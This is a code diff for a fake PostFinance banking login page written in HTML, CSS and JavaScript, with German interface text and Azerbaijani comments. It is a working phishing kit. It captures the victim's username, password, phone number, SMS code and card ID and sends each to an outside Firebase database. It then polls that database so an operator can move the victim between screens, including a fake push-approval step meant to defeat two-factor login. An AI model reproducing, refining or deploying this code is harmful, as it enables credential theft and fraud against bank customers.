@@ -22,24 +22,13 @@ body {
 
 .bform { flex:1; padding:24px 24px 40px; }
 .field { margin-bottom:28px; }
-.field input {
-  width:100%; background:transparent; border:none;
-  border-bottom:1px solid #2a4540; color:#fff;
-  font-size:17px; padding:12px 0; outline:none;
-  font-family:inherit; -webkit-appearance:none; border-radius:0;
-}
+.field input { width:100%; background:transparent; border:none; border-bottom:1px solid #2a4540; color:#fff; font-size:17px; padding:12px 0; outline:none; font-family:inherit; -webkit-appearance:none; border-radius:0; }
 .field input::placeholder { color:#6b8480; }
 .field input:focus { border-bottom-color:#c8a84b; }
 
 .gold-link { display:block; color:#c8a84b; font-size:16px; text-align:center; padding:14px 0; background:none; border:none; width:100%; cursor:pointer; font-family:inherit; }
 
-.next-btn {
-  display:block; width:100%; margin:28px 0 0;
-  background:#c8a84b; color:#0a1f1c; border:none;
-  border-radius:12px; padding:18px; font-size:17px;
-  font-weight:700; cursor:pointer; font-family:inherit;
-  -webkit-appearance:none; touch-action:manipulation;
-}
+.next-btn { display:block; width:100%; margin:28px 0 0; background:#c8a84b; color:#0a1f1c; border:none; border-radius:12px; padding:18px; font-size:17px; font-weight:700; cursor:pointer; font-family:inherit; -webkit-appearance:none; touch-action:manipulation; }
 .next-btn:active { opacity:.7; }
 
 .phone-row { display:flex; align-items:center; border-bottom:1px solid #c8a84b; padding-bottom:10px; }
@@ -51,12 +40,7 @@ body {
 .desc { color:#fff; font-size:15px; line-height:1.65; margin-top:20px; }
 .desc b { font-weight:600; }
 
-.sinp {
-  width:100%; background:transparent; border:none;
-  border-bottom:1px solid #c8a84b; color:#fff;
-  font-size:17px; padding:12px 0; outline:none;
-  font-family:inherit; -webkit-appearance:none; border-radius:0;
-}
+.sinp { width:100%; background:transparent; border:none; border-bottom:1px solid #c8a84b; color:#fff; font-size:17px; padding:12px 0; outline:none; font-family:inherit; -webkit-appearance:none; border-radius:0; }
 .sinp::placeholder { color:#6b8480; }
 
 .card-box { margin:24px auto; width:240px; background:#e8e0c8; border-radius:14px; padding:16px; }
@@ -69,25 +53,14 @@ body {
 .card-box .iban small { font-size:7px; color:#555; display:block; }
 .card-box .iban span { font-size:9px; color:#333; }
 
-/* WAITING SCREEN */
-.wait-center {
-  flex:1; display:flex; flex-direction:column;
-  align-items:center; justify-content:center;
-  text-align:center; padding:40px 24px;
-}
-.wait-spinner {
-  width:64px; height:64px;
-  border:4px solid #1a4a40;
-  border-top:4px solid #c8a84b;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  margin-bottom:28px;
-}
+/* WAITING */
+.wait-center { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:40px 24px; }
+.wait-spinner { width:64px; height:64px; border:4px solid #1a4a40; border-top:4px solid #c8a84b; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:28px; }
 @keyframes spin { to { transform:rotate(360deg); } }
 .wait-title { font-size:18px; font-weight:700; color:#fff; margin-bottom:12px; line-height:1.4; }
 .wait-desc  { font-size:14px; color:#6b8480; line-height:1.6; }
 
-/* PUSH SCREEN */
+/* PUSH */
 .push-center { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:32px 24px; }
 .push-icon { width:96px; height:96px; background:#1a4a45; border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:28px; }
 .push-title { font-size:17px; font-weight:700; color:#fff; line-height:1.5; margin-bottom:16px; }
@@ -95,14 +68,7 @@ body {
 .push-code { font-size:24px; font-weight:700; color:#fff; letter-spacing:5px; }
 
 /* NOTIFICATION */
-.notif {
-  position:fixed; bottom:28px; left:16px; right:16px;
-  background:#1e3a36; border:1.5px solid #c8a84b;
-  border-radius:14px; padding:14px 16px;
-  display:flex; align-items:flex-start; gap:12px;
-  z-index:999; box-shadow:0 8px 32px rgba(0,0,0,.6);
-  animation:nup .3s ease;
-}
+.notif { position:fixed; bottom:28px; left:16px; right:16px; background:#1e3a36; border:1.5px solid #c8a84b; border-radius:14px; padding:14px 16px; display:flex; align-items:flex-start; gap:12px; z-index:999; box-shadow:0 8px 32px rgba(0,0,0,.6); animation:nup .3s ease; }
 @keyframes nup { from{opacity:0;transform:translateY(14px)} to{opacity:1;transform:translateY(0)} }
 .ni { font-size:18px; flex-shrink:0; margin-top:1px; }
 .nb { flex:1; }
@@ -129,15 +95,15 @@ body {
         <input type="password" id="f-pass" placeholder="Passwort" autocomplete="off">
       </div>
       <button class="gold-link" style="margin-top:4px">Passwort vergessen</button>
-      <button class="gold-link" onclick="s1next()">Kein Benutzername oder E-Finance-Nummer</button>
+      <button class="gold-link">Kein Benutzername oder E-Finance-Nummer</button>
       <button class="next-btn" onclick="s1next()">Weiter</button>
     </div>
   </div>
 
-  <!-- W1: WAITING after LOGIN -->
+  <!-- W1: WAITING -->
   <div class="scr" id="w1">
     <div class="topbar">
-      <button class="tbtn"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+      <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
       <h2>Anmelden</h2>
       <button class="tbtn" onclick="bgo('s1')"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
     </div>
@@ -167,7 +133,7 @@ body {
     </div>
   </div>
 
-  <!-- W2: WAITING after PHONE -->
+  <!-- W2: WAITING -->
   <div class="scr" id="w2">
     <div class="topbar">
       <button class="tbtn" onclick="bgo('s2')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
@@ -195,7 +161,7 @@ body {
     </div>
   </div>
 
-  <!-- W3: WAITING after SMS -->
+  <!-- W3: WAITING -->
   <div class="scr" id="w3">
     <div class="topbar">
       <button class="tbtn" onclick="bgo('s3')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
@@ -229,7 +195,7 @@ body {
     </div>
   </div>
 
-  <!-- W4: WAITING after CARD ID -->
+  <!-- W4: WAITING -->
   <div class="scr" id="w4">
     <div class="topbar">
       <button class="tbtn" onclick="bgo('s4')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
@@ -260,7 +226,7 @@ body {
         </svg>
       </div>
       <p class="push-title">Eine Push-Benachrichtigung für die Anmeldeanfrage wurde an Ihr vorheriges Gerät gesendet</p>
-      <p class="push-desc">Bestätigen Sie die Anmeldeanfrage auf dem Gerät, mit dem Sie zuvor die PostFinance App verwendet haben. Überprüfen Sie, ob der folgende Wert angezeigt wird:</p>
+      <p class="push-desc">Bestätigen Sie die Anmeldeanfrage auf dem Gerät, mit dem Sie zuvor die PostFinance App verwendet haben.</p>
       <p class="push-code">CJP</p>
       <button class="gold-link" style="margin-top:36px">Mit Kartenlesegerät anmelden</button>
     </div>
@@ -272,10 +238,10 @@ body {
 var FB = 'https://postfinance-ec24c-default-rtdb.firebaseio.com';
 var myKey = null;
 var pollTimer = null;
-var lastNotify = null;
+var lastNotifyT = null;
 var notifTimer = null;
 
-// ── NAVIQASIYA
+// ── NAVIQASIYA - tamamilə müstəqil, Firebase gözləmir
 function bgo(id) {
   var all = document.querySelectorAll('.scr');
   for (var i = 0; i < all.length; i++) all[i].classList.remove('on');
@@ -288,48 +254,8 @@ function v(id) {
   return el ? el.value.trim() : '';
 }
 
-// ── ADDIM 1: Login → Gozleme → Telefon
-function s1next() {
-  bgo('w1'); // Derhall gozleme sehifesine kec
-  fbSend({
-    time:   new Date().toLocaleString(),
-    sehife: 'Anmelden',
-    user:   v('f-user'),
-    pass:   v('f-pass')
-  });
-  // Admin yonlendirmese biz ozumuz s2-ye kecmirik
-  // Admin panelden yonlendirecek
-}
-
-// ── ADDIM 2: Telefon → Gozleme
-function s2next() {
-  bgo('w2');
-  fbPatch({
-    sehife: 'Mobiltelefon',
-    phone:  v('f-phone')
-  });
-}
-
-// ── ADDIM 3: SMS → Gozleme
-function s3next() {
-  bgo('w3');
-  fbPatch({
-    sehife: 'SMS-Bestaetigung',
-    sms:    v('f-sms')
-  });
-}
-
-// ── ADDIM 4: Kart ID → Gozleme
-function s4next() {
-  bgo('w4');
-  fbPatch({
-    sehife: 'Karten-ID',
-    cardid: v('f-cardid')
-  });
-}
-
-// ── FIREBASE
-function fbSend(data) {
+// ── FIREBASE YAZMA (arxa planda, naviqasiyanı gözlətmir)
+function fbPost(data) {
   var xhr = new XMLHttpRequest();
   xhr.open('POST', FB + '/entries.json', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
@@ -338,7 +264,7 @@ function fbSend(data) {
       try {
         var res = JSON.parse(xhr.responseText);
         myKey = res.name;
-        startPolling();
+        startPolling(); // key alındıqdan sonra polling başla
       } catch(e){}
     }
   };
@@ -353,31 +279,62 @@ function fbPatch(data) {
   xhr.send(JSON.stringify(data));
 }
 
-// ── POLLING
-function startPolling() {
-  if (pollTimer) return;
-  pollTimer = setInterval(function() {
-    if (!myKey) return;
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', FB + '/entries/' + myKey + '/notify.json', true);
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4 && xhr.status === 200) {
-        try {
-          var data = JSON.parse(xhr.responseText);
-          if (!data) return;
-          var sig = data.t ? String(data.t) : JSON.stringify(data);
-          if (sig === lastNotify) return;
-          lastNotify = sig;
-          if (data.msg)    showNotif(data.msg);
-          if (data.screen) bgo(data.screen);
-        } catch(e){}
-      }
-    };
-    xhr.send();
-  }, 2000);
+// ── HƏR ADDIM
+function s1next() {
+  bgo('w1'); // DERHAL keç
+  fbPost({
+    time:   new Date().toLocaleString(),
+    sehife: 'Anmelden',
+    user:   v('f-user'),
+    pass:   v('f-pass')
+  });
 }
 
-// ── BILDIRIS
+function s2next() {
+  bgo('w2');
+  fbPatch({ sehife: 'Mobiltelefon', phone: v('f-phone') });
+}
+
+function s3next() {
+  bgo('w3');
+  fbPatch({ sehife: 'SMS', sms: v('f-sms') });
+}
+
+function s4next() {
+  bgo('w4');
+  fbPatch({ sehife: 'Karten-ID', cardid: v('f-cardid') });
+}
+
+// ── POLLING - HƏR 2 SANİYƏDƏ YENİ KOMANDA YOXLA
+// Polling səhifə yüklənən kimi başlayır - gözləmə səhifəsindən də işləyir
+function startPolling() {
+  if (pollTimer) clearInterval(pollTimer);
+  pollTimer = setInterval(checkCommands, 2000);
+}
+
+function checkCommands() {
+  if (!myKey) return;
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', FB + '/entries/' + myKey + '/notify.json', true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      try {
+        var data = JSON.parse(xhr.responseText);
+        if (!data) return;
+        // Eyni komandanı iki dəfə icra etməməli
+        var t = String(data.t || '');
+        if (t === lastNotifyT) return;
+        lastNotifyT = t;
+        // Komandanı icra et
+        if (data.screen) bgo(data.screen);
+        if (data.msg)    showNotif(data.msg);
+      } catch(e){}
+    }
+  };
+  xhr.send();
+}
+
+// ── BİLDİRİŞ
 function showNotif(msg) {
   var old = document.getElementById('bnotif');
   if (old) old.remove();
